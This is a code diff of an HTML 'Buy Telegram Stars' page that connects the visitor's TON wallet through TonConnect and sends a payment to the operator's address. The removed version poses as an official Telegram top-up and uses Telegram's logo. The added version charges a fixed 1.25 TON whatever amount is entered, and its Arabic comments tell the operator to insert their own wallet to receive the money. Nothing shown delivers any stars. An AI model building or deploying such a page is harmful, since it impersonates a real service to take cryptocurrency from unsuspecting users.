@@ -2,67 +2,72 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Telegram Stars | Official Top-up</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Premium Stars Terminal</title>
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
     <style>
-        :root { --primary: #0088cc; --bg: #0e1621; --card: #17212b; --text: #ffffff; }
-        body { background-color: var(--bg); color: var(--text); font-family: -apple-system, sans-serif; margin: 0; padding: 0; }
-        .header { padding: 30px; text-align: center; background: var(--card); border-bottom: 1px solid #242f3d; }
-        .logo { width: 60px; height: 60px; margin-bottom: 10px; }
-        .container { max-width: 400px; margin: 20px auto; padding: 0 15px; }
-        .panel { background: var(--card); border-radius: 15px; padding: 20px; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
-        .input-group { margin-bottom: 15px; }
-        .label { font-size: 12px; color: #6ab3f3; font-weight: bold; margin-bottom: 5px; display: block; }
-        input { width: 100%; background: #242f3d; border: 1px solid #3b4754; border-radius: 10px; padding: 12px; color: white; box-sizing: border-box; outline: none; }
-        .summary { margin-top: 20px; display: flex; justify-content: space-between; align-items: center; }
-        .price { font-size: 20px; font-weight: bold; }
-        .btn { background: var(--primary); border: none; color: white; padding: 12px 25px; border-radius: 10px; font-weight: bold; cursor: pointer; }
-        #ton-connect-button { display: none; }
+        body { background-color: #0e1621; color: white; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .card { background: #17212b; padding: 25px; border-radius: 15px; width: 320px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); text-align: center; }
+        h2 { color: #24a1de; margin-bottom: 20px; }
+        .input-group { text-align: left; margin-bottom: 15px; }
+        input { width: 100%; padding: 10px; border-radius: 8px; border: none; background: #242f3d; color: white; box-sizing: border-box; }
+        button { background: #24a1de; color: white; border: none; padding: 12px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        #ton-connect { margin-bottom: 20px; }
     </style>
 </head>
 <body>
-    <div class="header">
-        <img src="https://telegram.org/img/t_logo.png" class="logo" alt="Telegram">
-        <h3>Buy Telegram Stars</h3>
-    </div>
-    <div class="container">
-        <div class="panel">
-            <div class="input-group">
-                <span class="label">Recipient Username</span>
-                <input type="text" id="user" placeholder="@username" value="@me">
-            </div>
-            <div class="input-group">
-                <span class="label">Amount of Stars</span>
-                <input type="number" id="qty" value="1000" oninput="calc()">
-            </div>
-            <div class="summary">
-                <div class="price" id="res">2.50 TON</div>
-                <button class="btn" onclick="pay()">Buy Stars</button>
-            </div>
+
+    <div class="card">
+        <h2>⭐️ StarLink Hub</h2>
+        
+        <div id="ton-connect"></div>
+
+        <div class="input-group">
+            <label>Recipient Username</label>
+            <input type="text" placeholder="@username" id="user">
         </div>
+        <div class="input-group">
+            <label>Amount of Stars</label>
+            <input type="number" value="500" id="stars">
+        </div>
+        
+        <p style="font-size: 1.2em;">Total: <span id="price">1.25</span> TON</p>
+        
+        <button onclick="sendPayment()">Buy Stars Now</button>
     </div>
-    <div id="ton-connect-button"></div>
+
     <script>
-        const tonUI = new TON_CONNECT_UI.TonConnectUI({
+        // إعدادات الربط مع المحفظة
+        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
             manifestUrl: 'https://acenumber0.github.io/telegram/tonconnect-manifest.json',
-            buttonRootId: 'ton-connect-button'
+            buttonRootId: 'ton-connect'
         });
-        function calc() {
-            const q = document.getElementById('qty').value;
-            const p = (q * 0.0025).toFixed(2);
-            document.getElementById('res').innerText = p + " TON";
-            return p;
-        }
-        async function pay() {
-            if (!tonUI.connected) { await tonUI.openModal(); return; }
-            const a = calc();
-            const tx = { validUntil: Math.floor(Date.now()/1000)+300, messages: [{
-                address: "UQBNuacGY8g0jkr4mHsx6S9QFPNG3GTocxg-ZmB8Sgo5c_CS",
-                amount: (a * 1000000000).toString(),
-                payload: btoa("Stars_TopUp:" + document.getElementById('qty').value)
-            }]};
-            try { await tonUI.sendTransaction(tx); } catch(e) {}
+
+        async function sendPayment() {
+            // التحقق من ربط المحفظة أولاً
+            if (!tonConnectUI.connected) {
+                alert("Please connect your wallet first!");
+                return;
+            }
+
+            // إعداد تفاصيل المعاملة
+            const transaction = {
+                validUntil: Math.floor(Date.now() / 1000) + 300, 
+                messages: [
+                    {
+                        address: "ضع_عنوان_محفظتك_هنا", // <--- حط عنوان محفظتك هنا لاستقبال الفلوس
+                        amount: "1250000000" // مبلغ 1.25 TON بالنانو
+                    }
+                ]
+            };
+
+            try {
+                const result = await tonConnectUI.sendTransaction(transaction);
+                alert("Transaction Sent! Processing...");
+            } catch (e) {
+                console.error(e);
+                alert("Transaction Failed or Canceled.");
+            }
         }
     </script>
 </body>
